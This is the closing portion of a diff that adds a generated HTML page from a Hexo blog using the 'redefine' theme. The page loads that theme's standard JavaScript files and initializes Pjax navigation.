+                <i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+
+</main>
+
+
+
+<script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/utils.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/main.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/navbarShrink.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/scrollTopBottom.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/lightDarkSwitch.js"></script>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/localSearch.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/codeBlock.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/lazyload.js"></script>
+
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/runtime.js"></script>
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/odometer.min.js"></script>
+    <link rel="stylesheet" href="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/assets/odometer-theme-minimal.css">
+
+
+
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/Typed.min.js"></script>
+  <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/typed.js"></script>
+
+
+
+
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/tools/tocToggle.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/anime.min.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/layouts/toc.js"></script><script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/plugins/tabs.js"></script>
+    
+</div>
+
+
+    <script src="//evan.beee.top/projects/hexo-theme-redefine/v2.1.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax',
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            Global.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            Global.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            Global.refresh();
+        });
+    });
+</script>
+
+
+
+
+</body>
+</html>
